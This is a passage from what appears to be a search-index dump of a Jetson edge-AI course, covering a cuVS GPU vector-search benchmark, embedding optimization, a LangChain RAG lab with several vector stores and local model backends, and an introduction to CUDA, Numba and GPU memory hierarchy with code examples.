\"cuVS CAGRA\",\n                \"num_docs\": num_docs,\n                \"indexing_time_s\": round(indexing_time, 3),\n                \"avg_query_time_ms\": round(avg_query_time, 3),\n                \"memory_usage_mb\": round(memory_after - memory_before, 2),\n                \"gpu_memory_mb\": round(gpu_memory_mb, 2),\n                \"throughput_docs_per_sec\": round(num_docs / indexing_time, 2),\n                \"graph_degree\": 32,\n                \"status\": \"success\"\n            }\n\n        except Exception as e:\n            return {\n                \"algorithm\": \"cuVS CAGRA\",\n                \"status\": \"failed\",\n                \"error\": str(e)\n            }\n\n    def run_cuvs_benchmark(self) -&gt; List[Dict[str, Any]]:\n        \"\"\"Run comprehensive cuVS benchmark\"\"\"\n        results = []\n        test_sizes = [1000, 5000, 10000]\n\n        algorithms = [\n            (\"IVF-Flat\", self.benchmark_cuvs_ivf_flat),\n            (\"IVF-PQ\", self.benchmark_cuvs_ivf_pq),\n            (\"CAGRA\", self.benchmark_cuvs_cagra)\n        ]\n\n        print(\"\ud83d\ude80 Starting cuVS Benchmark on Jetson\")\n        print(\"=\" * 50)\n\n        for algo_name, benchmark_func in algorithms:\n            print(f\"\\n\ud83d\udd2c Testing {algo_name}...\")\n\n            for num_docs in test_sizes:\n                print(f\"  \ud83d\udcca {num_docs} documents...\")\n                result = benchmark_func(num_docs)\n                results.append(result)\n\n                if result[\"status\"] == \"success\":\n                    print(f\"    \u2705 Index: {result['indexing_time_s']:.2f}s, \"\n                          f\"Query: {result['avg_query_time_ms']:.2f}ms\")\n                else:\n                    print(f\"    \u274c Failed: {result['error']}\")\n\n        return results\n\n    def generate_cuvs_report(self, results: List[Dict[str, Any]]) -&gt; str:\n        \"\"\"Generate cuVS performance report\"\"\"\n        successful_results = [r for r in results if r[\"status\"] == \"success\"]\n\n        if not successful_results:\n            return \"No successful cuVS benchmarks to report.\"\n\n        report = \"\\n\" + \"=\" * 70\n        report += \"\\n\ud83c\udfc6 NVIDIA cuVS PERFORMANCE REPORT ON JETSON\\n\"\n        report += \"=\" * 70 + \"\\n\"\n\n        # Performance by algorithm\n        algorithms = list(set(r[\"algorithm\"] for r in successful_results))\n\n        for algo in algorithms:\n            algo_results = [r for r in successful_results if r[\"algorithm\"] == algo]\n            if not algo_results:\n                continue\n\n            report += f\"\\n\ud83d\udd2c {algo} PERFORMANCE:\\n\"\n            report += \"-\" * 50 + \"\\n\"\n            report += f\"{'Docs':&lt;8} {'Index(s)':&lt;10} {'Query(ms)':&lt;12} {'GPU(MB)':&lt;10}\\n\"\n            report += \"-\" * 50 + \"\\n\"\n\n            for result in sorted(algo_results, key=lambda x: x[\"num_docs\"]):\n                report += f\"{result['num_docs']:&lt;8} {result['indexing_time_s']:&lt;10.2f} \"\n                report += f\"{result['avg_query_time_ms']:&lt;12.2f} {result['gpu_memory_mb']:&lt;10.1f}\\n\"\n\n        # Performance comparison\n        if len(successful_results) &gt; 1:\n            fastest_query = min(successful_results, key=lambda x: x[\"avg_query_time_ms\"])\n            fastest_index = min(successful_results, key=lambda x: x[\"indexing_time_s\"])\n            most_efficient = min(successful_results, key=lambda x: x[\"gpu_memory_mb\"])\n\n            report += \"\\n\ud83c\udfc5 BEST PERFORMERS:\\n\"\n            report += \"-\" * 30 + \"\\n\"\n            report += f\"\u26a1 Fastest Query: {fastest_query['algorithm']} ({fastest_query['avg_query_time_ms']:.2f}ms)\\n\"\n            report += f\"\ud83d\ude80 Fastest Index: {fastest_index['algorithm']} ({fastest_index['indexing_time_s']:.2f}s)\\n\"\n            report += f\"\ud83d\udcbe Most Efficient: {most_efficient['algorithm']} ({most_efficient['gpu_memory_mb']:.1f}MB)\\n\"\n\n        # Recommendations\n        report += \"\\n\ud83c\udfaf cuVS RECOMMENDATIONS:\\n\"\n        report += \"-\" * 30 + \"\\n\"\n        report += \"\ud83d\udd39 IVF-Flat: Best for accuracy and moderate datasets\\n\"\n        report += \"\ud83d\udd39 IVF-PQ: Best for memory-constrained large datasets\\n\"\n        report += \"\ud83d\udd39 CAGRA: Best for ultra-fast queries on GPU\\n\"\n        report += \"\ud83d\udd39 Use GPU memory pooling for better performance\\n\"\n\n        return report\n\n# Run cuVS benchmark\nif cuvs is not None and cp is not None:\n    cuvs_benchmark = CuVSBenchmark()\n    cuvs_results = cuvs_benchmark.run_cuvs_benchmark()\n    cuvs_report = cuvs_benchmark.generate_cuvs_report(cuvs_results)\n    print(cuvs_report)\nelse:\n    print(\"\u26a0\ufe0f cuVS or CuPy not available. Install to run GPU-accelerated benchmarks.\")\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#expected-cuvs-performance-on-jetson-orin","title":"\ud83d\udcca Expected cuVS Performance on Jetson Orin","text":"Algorithm Docs Indexing (s) Query (ms) GPU Memory (MB) Speedup vs CPU IVF-Flat 1000 0.08 0.3 12 15x IVF-Flat 10000 0.45 0.5 95 18x IVF-PQ 1000 0.12 0.4 8 12x IVF-PQ 10000 0.68 0.7 35 14x CAGRA 1000 0.25 0.2 18 25x CAGRA 10000 1.2 0.3 120 30x"},{"location":"curriculum/09_rag_app_langchain_jetson/#embedding-optimization-strategies","title":"\ud83d\udd27 Embedding Optimization Strategies","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#1-model-quantization","title":"1. Model Quantization","text":"<pre><code>import torch\nfrom sentence_transformers import SentenceTransformer\n\ndef quantize_embedding_model(model_name: str):\n    \"\"\"Quantize embedding model for Jetson deployment\"\"\"\n    model = SentenceTransformer(model_name)\n\n    # Dynamic quantization (CPU)\n    quantized_model = torch.quantization.quantize_dynamic(\n        model[0].auto_model,\n        {torch.nn.Linear},\n        dtype=torch.qint8\n    )\n\n    # Replace the transformer in the model\n    model[0].auto_model = quantized_model\n    return model\n\n# Usage\nquantized_model = quantize_embedding_model(\"all-MiniLM-L6-v2\")\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#2-tensorrt-optimization","title":"2. TensorRT Optimization","text":"<pre><code>import tensorrt as trt\nimport torch\nfrom torch2trt import torch2trt\n\ndef optimize_with_tensorrt(model, input_shape):\n    \"\"\"Optimize embedding model with TensorRT\"\"\"\n    model.eval()\n\n    # Create example input\n    x = torch.ones(input_shape).cuda()\n\n    # Convert to TensorRT\n    model_trt = torch2trt(\n        model, \n        [x], \n        fp16_mode=True,  # Use FP16 for better performance\n        max_workspace_size=1&lt;&lt;25  # 32MB workspace\n    )\n\n    return model_trt\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#3-batch-processing-optimization","title":"3. Batch Processing Optimization","text":"<pre><code>class OptimizedEmbeddingProcessor:\n    \"\"\"Optimized embedding processing for Jetson\"\"\"\n\n    def __init__(self, model_name: str, batch_size: int = 32):\n        self.model = SentenceTransformer(model_name)\n        self.batch_size = batch_size\n\n        # Enable GPU if available\n        if torch.cuda.is_available():\n            self.model = self.model.cuda()\n\n    def encode_optimized(self, texts: List[str]) -&gt; np.ndarray:\n        \"\"\"Optimized batch encoding\"\"\"\n        embeddings = []\n\n        # Process in optimized batches\n        for i in range(0, len(texts), self.batch_size):\n            batch = texts[i:i + self.batch_size]\n\n            with torch.no_grad():  # Disable gradients for inference\n                batch_embeddings = self.model.encode(\n                    batch,\n                    convert_to_numpy=True,\n                    show_progress_bar=False,\n                    normalize_embeddings=True  # Normalize for cosine similarity\n                )\n\n            embeddings.append(batch_embeddings)\n\n        return np.vstack(embeddings)\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#integration-with-langchain","title":"\ud83c\udfaf Integration with LangChain","text":"<pre><code>from langchain.embeddings.base import Embeddings\nfrom typing import List\n\nclass CuVSEmbeddings(Embeddings):\n    \"\"\"LangChain-compatible cuVS embeddings\"\"\"\n\n    def __init__(self, model_name: str = \"all-MiniLM-L6-v2\"):\n        self.processor = OptimizedEmbeddingProcessor(model_name)\n\n    def embed_documents(self, texts: List[str]) -&gt; List[List[float]]:\n        \"\"\"Embed a list of documents\"\"\"\n        embeddings = self.processor.encode_optimized(texts)\n        return embeddings.tolist()\n\n    def embed_query(self, text: str) -&gt; List[float]:\n        \"\"\"Embed a single query\"\"\"\n        embedding = self.processor.encode_optimized([text])\n        return embedding[0].tolist()\n\n# Usage with LangChain\nfrom langchain.vectorstores import FAISS\nfrom langchain.schema import Document\n\n# Create optimized embeddings\nembeddings = CuVSEmbeddings()\n\n# Create documents\ndocuments = [\n    Document(page_content=\"NVIDIA Jetson enables edge AI computing.\"),\n    Document(page_content=\"cuVS provides GPU-accelerated vector search.\"),\n    Document(page_content=\"LangChain simplifies RAG application development.\")\n]\n\n# Create vector store with optimized embeddings\nvectorstore = FAISS.from_documents(documents, embeddings)\n\n# Perform similarity search\nquery = \"What is Jetson used for?\"\nresults = vectorstore.similarity_search(query, k=2)\nprint(f\"Query: {query}\")\nfor i, doc in enumerate(results):\n    print(f\"Result {i+1}: {doc.page_content}\")\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#performance-summary","title":"\ud83c\udfc6 Performance Summary","text":"Optimization Speedup Memory Reduction Accuracy Impact cuVS GPU 15-30x - Minimal Model Quantization 2-3x 75% &lt;2% TensorRT FP16 1.5-2x 50% &lt;1% Batch Processing 3-5x - None Combined 50-100x 60% &lt;3%"},{"location":"curriculum/09_rag_app_langchain_jetson/#lab-build-rag-app-with-multiple-backends-on-jetson","title":"\ud83e\uddea Lab: Build RAG App with Multiple Backends on Jetson","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#setup","title":"\ud83e\uddf0 Setup","text":"<pre><code>pip install langchain llama-cpp-python chromadb faiss-cpu qdrant-client sentence-transformers\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#step-1-load-and-split-document","title":"\ud83d\udd39 Step 1: Load and Split Document","text":"<pre><code>from langchain.document_loaders import TextLoader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\n\nloader = TextLoader(\"data/jetson_guide.txt\")\ndocs = loader.load()\nsplitter = RecursiveCharacterTextSplitter(chunk_size=300, chunk_overlap=50)\nchunks = splitter.split_documents(docs)\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#step-2-embed-and-index-choose-backend","title":"\ud83d\udd39 Step 2: Embed and Index (Choose Backend)","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#option-a-chromadb","title":"Option A: ChromaDB","text":"<pre><code>from langchain.embeddings import SentenceTransformerEmbeddings\nfrom langchain.vectorstores import Chroma\n\nembedding = SentenceTransformerEmbeddings(model_name=\"all-MiniLM-L6-v2\")\nvectorstore = Chroma.from_documents(chunks, embedding, persist_directory=\"db_chroma\")\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#option-b-faiss","title":"Option B: FAISS","text":"<pre><code>from langchain.vectorstores import FAISS\nfaiss_store = FAISS.from_documents(chunks, embedding)\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#option-c-qdrant-self-hosted-or-remote","title":"Option C: Qdrant (self-hosted or remote)","text":"<pre><code>from langchain.vectorstores import Qdrant\nfrom qdrant_client import QdrantClient\n\nclient = QdrantClient(path=\"./qdrant_data\")\nqdrant_store = Qdrant.from_documents(chunks, embedding, client=client, collection_name=\"jetson_docs\")\n</code></pre> <p>Convert any vector store to retriever:</p> <pre><code>retriever = vectorstore.as_retriever()\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#step-3-rag-with-multiple-model-inference-backends","title":"\ud83d\udd39 Step 3: RAG with Multiple Model Inference Backends","text":""},{"location":"curriculum/09_rag_app_langchain_jetson/#llama-cpp-backend-local-gguf-model","title":"\u2705 llama-cpp Backend (Local GGUF Model)","text":"<pre><code>from langchain.llms import LlamaCpp\nfrom langchain.chains import RetrievalQA\n\nllm = LlamaCpp(model_path=\"/models/mistral.gguf\", n_gpu_layers=80)\nqa = RetrievalQA.from_chain_type(llm=llm, retriever=retriever)\nprint(qa.run(\"What is Jetson Orin Nano used for?\"))\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#ollama-backend-local-rest-api","title":"\u2705 Ollama Backend (Local REST API)","text":"<pre><code>from langchain.llms import OpenAI\nollama_llm = OpenAI(base_url=\"http://localhost:11434/v1\", api_key=\"ollama\")\nqa_ollama = RetrievalQA.from_chain_type(llm=ollama_llm, retriever=retriever)\nprint(qa_ollama.run(\"What is Jetson Orin Nano used for?\"))\n</code></pre>"},{"location":"curriculum/09_rag_app_langchain_jetson/#lab-deliverables","title":"\ud83d\udccb Lab Deliverables","text":"<ul> <li>Run the same query across multiple vector DBs and model backends</li> <li> <p>Record differences in:</p> </li> <li> <p>Latency</p> </li> <li>Answer quality</li> <li>Memory usage</li> <li>Submit a table comparing results</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#use-cases-for-jetson-edge","title":"\ud83d\udca1 Use Cases for Jetson Edge","text":"<ul> <li>Campus FAQ bots with private syllabus</li> <li>On-device document search (manuals, code docs)</li> <li>Assistive RAG chatbot with no internet</li> </ul>"},{"location":"curriculum/09_rag_app_langchain_jetson/#summary","title":"\u2705 Summary","text":"<ul> <li>RAG augments LLMs with context-aware search</li> <li>Vector DB options: Chroma, FAISS, Qdrant (all lightweight and Jetson-compatible)</li> <li>Inference backends: llama.cpp and Ollama, both support GGUF models</li> <li>Jetson can handle small-to-medium scale RAG locally with optimized models</li> </ul> <p>\u2192 Next: Local AI Agents</p>"},{"location":"curriculum/my_01c_accelerated_computing/","title":"\ud83d\ude80 02: Accelerated Computing on Jetson (CUDA, Numba, NumPy, PyTorch)","text":"<p>Accelerated computing leverages GPUs and other hardware accelerators to significantly improve performance in data processing, AI, and scientific computation. NVIDIA Jetson devices are optimized for this via CUDA and Tensor Cores.</p> <p>This module introduces key libraries and techniques to write accelerated code using:</p> <ul> <li>CUDA (native + via libraries)</li> <li>Numba (Python JIT for GPU)</li> <li>NumPy (with CuPy)</li> <li>PyTorch with GPU acceleration</li> </ul>"},{"location":"curriculum/my_01c_accelerated_computing/#learning-objectives","title":"\ud83c\udfaf Learning Objectives","text":"<p>By the end of this tutorial, you will: - Understand the fundamentals of accelerated computing and parallel processing - Master GPU architecture, memory hierarchy, and execution models - Learn CUDA programming concepts and optimization techniques - Implement GPU-accelerated applications using various frameworks - Optimize code for Jetson devices with performance profiling - Apply theoretical knowledge to real-world acceleration problems</p>"},{"location":"curriculum/my_01c_accelerated_computing/#theoretical-background","title":"\ud83d\udcda Theoretical Background","text":""},{"location":"curriculum/my_01c_accelerated_computing/#what-is-accelerated-computing","title":"What is Accelerated Computing?","text":"<p>Accelerated computing uses specialized hardware (like GPUs) to perform computations faster than traditional CPUs. This is particularly effective for:</p> <ul> <li>Parallel workloads: Tasks that can be divided into many smaller, independent operations</li> <li>Mathematical computations: Linear algebra, signal processing, machine learning</li> <li>Data processing: Large datasets, image/video processing</li> </ul>"},{"location":"curriculum/my_01c_accelerated_computing/#cpu-vs-gpu-architecture","title":"CPU vs GPU Architecture","text":"Aspect CPU GPU Cores Few (4-16) powerful cores Many (hundreds to thousands) simpler cores Design Optimized for sequential processing Optimized for parallel processing Memory Large cache, complex memory hierarchy Smaller cache, high bandwidth memory Best for Complex logic, branching Simple operations on large datasets"},{"location":"curriculum/my_01c_accelerated_computing/#gpu-architecture-deep-dive","title":"\ud83c\udfd7\ufe0f GPU Architecture Deep Dive","text":""},{"location":"curriculum/my_01c_accelerated_computing/#streaming-multiprocessors-sms","title":"Streaming Multiprocessors (SMs)","text":"<p>Modern GPUs are organized into Streaming Multiprocessors, each containing:</p> <ul> <li>CUDA Cores: Basic processing units (32-128 per SM)</li> <li>Shared Memory: Fast, low-latency memory shared among threads in a block</li> <li>Registers: Fastest memory, private to each thread</li> <li>Warp Schedulers: Manage groups of 32 threads (warps)</li> </ul> <pre><code># Example: Understanding GPU architecture programmatically\nimport pycuda.driver as cuda\nimport pycuda.autoinit\nfrom pycuda.compiler import SourceModule\n\ndef get_gpu_properties():\n    \"\"\"Query and display GPU architecture properties\"\"\"\n    device = cuda.Device(0)\n    props = device.get_attributes()\n\n    print(\"=== GPU Architecture Properties ===\")\n    print(f\"Device Name: {device.name()}\")\n    print(f\"Compute Capability: {device.compute_capability()}\")\n    print(f\"Multiprocessor Count: {props[cuda.device_attribute.MULTIPROCESSOR_COUNT]}\")\n    print(f\"Max Threads per Block: {props[cuda.device_attribute.MAX_THREADS_PER_BLOCK]}\")\n    print(f\"Max Block Dimensions: ({props[cuda.device_attribute.MAX_BLOCK_DIM_X]}, \"\n          f\"{props[cuda.device_attribute.MAX_BLOCK_DIM_Y]}, \"\n          f\"{props[cuda.device_attribute.MAX_BLOCK_DIM_Z]})\")\n    print(f\"Max Grid Dimensions: ({props[cuda.device_attribute.MAX_GRID_DIM_X]}, \"\n          f\"{props[cuda.device_attribute.MAX_GRID_DIM_Y]}, \"\n          f\"{props[cuda.device_attribute.MAX_GRID_DIM_Z]})\")\n    print(f\"Shared Memory per Block: {props[cuda.device_attribute.MAX_SHARED_MEMORY_PER_BLOCK]} bytes\")\n    print(f\"Registers per Block: {props[cuda.device_attribute.MAX_REGISTERS_PER_BLOCK]}\")\n    print(f\"Warp Size: {props[cuda.device_attribute.WARP_SIZE]}\")\n    print(f\"Global Memory: {device.total_memory() // (1024**3)} GB\")\n    print(f\"Memory Clock Rate: {props[cuda.device_attribute.MEMORY_CLOCK_RATE] / 1000} MHz\")\n    print(f\"Memory Bus Width: {props[cuda.device_attribute.GLOBAL_MEMORY_BUS_WIDTH]} bits\")\n\n    # Calculate theoretical memory bandwidth\n    memory_bandwidth = (props[cuda.device_attribute.MEMORY_CLOCK_RATE] * 2 * \n                       props[cuda.device_attribute.GLOBAL_MEMORY_BUS_WIDTH] / 8) / 1e6\n    print(f\"Theoretical Memory Bandwidth: {memory_bandwidth:.1f} GB/s\")\n\nget_gpu_properties()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#memory-hierarchy-and-performance","title":"Memory Hierarchy and Performance","text":"<pre><code>import numpy as np\nimport time\nfrom numba import cuda\n\n@cuda.jit\ndef memory_benchmark_kernel(global_mem, shared_mem_size, iterations):\n    \"\"\"Benchmark different memory types\"\"\"\n    # Shared memory allocation\n    shared_mem = cuda.shared.array(shared_mem_size, dtype=cuda.float32)\n\n    tid = cuda.threadIdx.x\n    bid = cuda.blockIdx.x\n    idx = bid * cuda.blockDim.x + tid\n\n    # Initialize shared memory\n    if tid &lt; shared_mem_size:\n        shared_mem[tid] = tid * 1.0\n    cuda.syncthreads()\n\n    # Global memory access pattern\n    global_sum = 0.0\n    for i in range(iterations):\n        if idx &lt; global_mem.size:\n            global_sum += global_mem[idx]\n\n    # Shared memory access pattern\n    shared_sum = 0.0\n    for i in range(iterations):\n        shared_sum += shared_mem[tid % shared_mem_size]\n\n    # Write results back\n    if idx &lt; global_mem.size:\n        global_mem[idx] = global_sum + shared_sum\n\ndef memory_performance_analysis():\n    \"\"\"Analyze memory access patterns and performance\"\"\"\n    N = 1024 * 1024\n    data = np.random.random(N).astype(np.float32)\n    d_data = cuda.to_device(data)\n\n    threads_per_block = 256\n    blocks_per_grid = (N + threads_per_block - 1) // threads_per_block\n    shared_mem_size = 256\n    iterations = 100\n\n    print(\"=== Memory Performance Analysis ===\")\n\n    # Benchmark memory access\n    start_time = time.time()\n    memory_benchmark_kernel[blocks_per_grid, threads_per_block](\n        d_data, shared_mem_size, iterations\n    )\n    cuda.synchronize()\n    gpu_time = time.time() - start_time\n\n    # Calculate memory throughput\n    bytes_accessed = N * 4 * iterations * 2  # Read + Write, 4 bytes per float\n    throughput = bytes_accessed / gpu_time / 1e9\n\n    print(f\"GPU Time: {gpu_time:.4f}s\")\n    print(f\"Memory Throughput: {throughput:.2f} GB/s\")\n    print(f\"Operations: {N * iterations / gpu_time / 1e6:.2f} M ops/sec\")\n\nmemory_performance_analysis()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#parallel-computing-models","title":"\ud83e\uddee Parallel Computing Models","text":""},{"location":"curriculum/my_01c_accelerated_computing/#simd-vs-simt","title":"SIMD vs SIMT","text":"<ul> <li>SIMD (Single Instruction, Multiple Data): Traditional vector processing</li> <li>SIMT (Single Instruction, Multiple Thread): GPU's execution model</li> <li>Threads in a warp execute the same instruction</li> <li>Allows for thread divergence (with performance cost)</li> <li>More flexible than pure SIMD</li> </ul>"},{"location":"curriculum/my_01c_accelerated_computing/#amdahls-law-and-parallel-efficiency","title":"Amdahl's Law and Parallel Efficiency","text":"<pre><code>import matplotlib.pyplot as plt\nimport numpy as np\n\ndef amdahls_law(p, n):\n    \"\"\"Calculate speedup using Amdahl's Law\n    p: fraction of program that can be parallelized (0-1)\n    n: number of processors\n    \"\"\"\n    return 1 / ((1 - p) + p / n)\n\ndef plot_amdahls_law():\n    \"\"\"Visualize the impact of parallel fraction on speedup\"\"\"\n    processors = np.logspace(0, 3, 100)  # 1 to 1000 processors\n    parallel_fractions = [0.5, 0.75, 0.9, 0.95, 0.99]\n\n    plt.figure(figsize=(10, 6))\n\n    for p in parallel_fractions:\n        speedup = [amdahls_law(p, n) for n in processors]\n        plt.semilogx(processors, speedup, label=f'Parallel fraction = {p}')\n\n    plt.xlabel('Number of Processors')\n    plt.ylabel('Speedup')\n    plt.title(\"Amdahl's Law: Theoretical Speedup vs Number of Processors\")\n    plt.legend()\n    plt.grid(True, alpha=0.3)\n    plt.xlim(1, 1000)\n    plt.show()\n\n    # Calculate practical implications\n    print(\"=== Amdahl's Law Analysis ===\")\n    for p in [0.9, 0.95, 0.99]:\n        max_speedup = 1 / (1 - p)\n        print(f\"Parallel fraction {p*100}%: Maximum possible speedup = {max_speedup:.1f}x\")\n\nplot_amdahls_law()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#memory-access-patterns-and-coalescing","title":"Memory Access Patterns and Coalescing","text":"<pre><code>from numba import cuda\nimport numpy as np\nimport time\n\n@cuda.jit\ndef coalesced_access(data, result):\n    \"\"\"Demonstrate coalesced memory access\"\"\"\n    idx = cuda.grid(1)\n    if idx &lt; data.size:\n        # Coalesced access: consecutive threads access consecutive memory\n        result[idx] = data[idx] * 2.0\n\n@cuda.jit\ndef strided_access(data, result, stride):\n    \"\"\"Demonstrate strided memory access\"\"\"\n    idx = cuda.grid(1)\n    if idx &lt; data.size:\n        # Strided access: threads access memory with a stride\n        access_idx = (idx * stride) % data.size\n        result[idx] = data[access_idx] * 2.0\n\n@cuda.jit\ndef random_access(data, result, indices):\n    \"\"\"Demonstrate random memory access\"\"\"\n    idx = cuda.grid(1)\n    if idx &lt; data.size:\n        # Random access: unpredictable memory access pattern\n        access_idx = indices[idx] % data.size\n        result[idx] = data[access_idx] * 2.0\n\ndef memory_access_benchmark():\n    \"\"\"Benchmark different memory access patterns\"\"\"\n    N = 1024 * 1024\n    data = np.random.random(N).astype(np.float32)\n    result = np.zeros(N, dtype=np.float32)\n    indices = np.random.randint(0, N, N).astype(np.int32)\n\n    d_data = cuda.to_device(data)\n    d_result = cuda.to_device(result)\n    d_indices = cuda.to_device(indices)\n\n    threads_per_block = 256\n    blocks_per_grid = (N + threads_per_block - 1) // threads_per_block\n\n    print(\"=== Memory Access Pattern Benchmark ===\")\n\n    # Coalesced access\n    start_time = time.time()\n    coalesced_access[blocks_per_grid, threads_per_block](d_data, d_result)\n    cuda.synchronize()\n    coalesced_time = time.time() - start_time\n    print(f\"Coalesced access: {coalesced_time:.4f}s\")\n\n    # Strided access\n    start_time = time.time()\n    strided_access[blocks_per_grid, threads_per_block](d_data, d_result, 32)\n    cuda.synchronize()\n    strided_time = time.time() - start_time\n    print(f\"Strided access (stride=32): {strided_time:.4f}s\")\n\n    # Random access\n    start_time = time.time()\n    random_access[blocks_per_grid, threads_per_block](d_data, d_result, d_indices)\n    cuda.synchronize()\n    random_time = time.time() - start_time\n    print(f\"Random access: {random_time:.4f}s\")\n\n    print(f\"\\nPerformance ratios:\")\n    print(f\"Strided vs Coalesced: {strided_time/coalesced_time:.2f}x slower\")\n    print(f\"Random vs Coalesced: {random_time/coalesced_time:.2f}x slower\")\n\nmemory_access_benchmark()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#jetson-hardware","title":"\ud83d\udd27 Jetson Hardware:","text":"<ul> <li>CUDA cores: For general-purpose parallelism</li> <li>Tensor cores: Accelerated AI math (INT8, FP16)</li> <li>DLA (Deep Learning Accelerator): Fixed function for inference</li> </ul>"},{"location":"curriculum/my_01c_accelerated_computing/#memory-considerations","title":"\u23f1\ufe0f Memory Considerations:","text":"<ul> <li>CUDA global memory: large but slower</li> <li>Shared memory: faster but limited to thread blocks</li> <li>Memory transfers between CPU (host) and GPU (device) are expensive and must be minimized</li> </ul>"},{"location":"curriculum/my_01c_accelerated_computing/#types-of-parallelism","title":"\ud83e\uddee Types of Parallelism:","text":"<ul> <li>Data Parallelism: Same operation applied to many elements (e.g., matrix multiplication)</li> <li>Task Parallelism: Different operations executed in parallel (e.g., CNN layers, asynchronous operations)</li> </ul>"},{"location":"curriculum/my_01c_accelerated_computing/#cuda-programming-model","title":"CUDA Programming Model","text":"<p>CUDA (Compute Unified Device Architecture) is NVIDIA's parallel computing platform:</p> <ul> <li>Host: CPU and its memory</li> <li>Device: GPU and its memory</li> <li>Kernel: Function that runs on GPU</li> <li>Thread: Basic unit of execution</li> <li>Block: Group of threads that can cooperate</li> <li>Grid: Collection of blocks</li> </ul>"},{"location":"curriculum/my_01c_accelerated_computing/#thread-hierarchy-and-execution-model","title":"Thread Hierarchy and Execution Model","text":"<pre><code># Understanding CUDA thread hierarchy\nfrom numba import cuda\nimport numpy as np\n\n@cuda.jit\ndef thread_info_kernel(output):\n    \"\"\"Kernel to understand thread hierarchy\"\"\"\n    # Thread indices\n    tx = cuda.threadIdx.x\n    ty = cuda.threadIdx.y\n    tz = cuda.threadIdx.z\n\n    # Block indices\n    bx = cuda.blockIdx.x\n    by = cuda.blockIdx.y\n    bz = cuda.blockIdx.z\n\n    # Block dimensions\n    bdx = cuda.blockDim.x\n    bdy = cuda.blockDim.y\n    bdz = cuda.blockDim.z\n\n    # Grid dimensions\n    gdx = cuda.gridDim.x\n    gdy = cuda.gridDim.y\n    gdz = cuda.gridDim.z\n\n    # Calculate global thread ID\n    global_id = (bz * gdy * gdx * bdz * bdy * bdx +\n                by * gdx * bdy * bdx +\n                bx * bdy * bdx +\n                tz * bdy * bdx +\n                ty * bdx +\n                tx)\n\n    if global_id &lt; output.size:\n        output[global_id] = global_id\n\ndef demonstrate_thread_hierarchy():\n    \"\"\"Demonstrate CUDA thread hierarchy\"\"\"\n    # Create a 3D grid and block configuration\n    threads_per_block = (4, 4, 2)  # 32 threads per block\n    blocks_per_grid = (2, 2, 1)    # 4 blocks total\n\n    total_threads = (threads_per_block[0] * threads_per_block[1] * threads_per_block[2] *\n                    blocks_per_grid[0] * blocks_per_grid[1] * blocks_per_grid[2])\n\n    output = np.zeros(total_threads, dtype=np.int32)\n    d_output = cuda.to_device(output)\n\n    print(\"=== CUDA Thread Hierarchy Demo ===\")\n    print(f\"Threads per block: {threads_per_block}\")\n    print(f\"Blocks per grid: {blocks_per_grid}\")\n    print(f\"Total threads: {total_threads}\")\n\n    thread_info_kernel[blocks_per_grid, threads_per_block](d_output)\n    result = d_output.copy_to_host()\n\n    print(f\"Thread IDs: {result[:16]}...\")  # Show first 16 thread IDs\n\ndemonstrate_thread_hierarchy()\n</code></pre>"},{"location":"curriculum/my_01c_accelerated_computing/#cuda-c","title":"\ud83d\udd27 CUDA (C++)","text":"<p>The CUDA Toolkit targets a class of applications whose control part runs as a process on a general purpose computing device, and which use one or more NVIDIA GPUs as coprocessors for accelerating single program, multiple data (SPMD) parallel jobs. Such jobs are self-contained, in the sense that they can be executed and completed by a batch of GPU threads entirely without intervention by the host process, thereby gaining optimal benefit from the parallel graphics hardware.</p> <p>Jetson supports native CUDA (C/C++) for fine-grained control. Ideal for performance-critical compute kernels.</p> <p>NVIDIA CUDA Compiler (NVCC): NVCC is a compiler driver provided by NVIDIA for compiling CUDA C/C++ programs. It's a toolchain that manages the compilation process, generating binary executables containing both host (CPU) code and device (GPU) code, including PTX and SASS.     - It works by invoking other tools like a C++ compiler (e.g., g++) and the CUDA runtime library.     - It's used to compile CUDA code, which is often found in source files with the .cu extension.     - The output can be C code (for the host) or PTX code (for the device), and potentially directly compiled SASS code. </p> <p>The compilation trajectory involves several splitting, compilation, preprocessing, and merging steps for each CUDA source file. It is the purpose of nvcc, the CUDA compiler driver, to hide the intricate details of CUDA compilation from developers. It accepts a range of conventional compiler options, such as for defining macros and include/library paths, and for steering the compilation process. All non-CUDA compilation steps are forwarded to a C++ host compiler that is supported by nvcc, and nvcc translates its options to appropriate host compiler command line options.</p> <p>reference: Cuda C Programming Guide</p>"},{"location":"curriculum/my_01c_accelerated_computing/#cuda-programming-fundamentals","title":"\u2705 CUDA Programming Fundamentals","text":""},{"location":"curriculum/my_01c_accelerated_computing/#memory-hierarchy-and-management","title":"Memory Hierarchy and Management","text":"<p>CUDA memory hierarchy is crucial for performance optimization:</p> <pre><code>// vector_add.cu - Basic CUDA kernel example\n#include &lt;cuda_runtime.h&gt;\n#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;chrono&gt;\n\n__global__ void vectorAdd(float* A, float* B, float* C, int N) {\n    int idx = blockIdx.x * blockDim.x + threadIdx.x;\n    if (idx &lt; N) {\n        C[idx] = A[idx] + B[idx];\n    }\n}\n\n// Matrix multiplication with shared memory optimization\n__global__ void matrixMulShared(float* A, float* B, float* C, int N) {\n    __shared__ float As[16][16];\n    __shared__ float Bs[16][16];\n\n    int bx = blockIdx.x, by = blockIdx.y;\n    int tx = threadIdx.x, ty = threadIdx.y;\n\n    int row = by * 16 + ty;\n    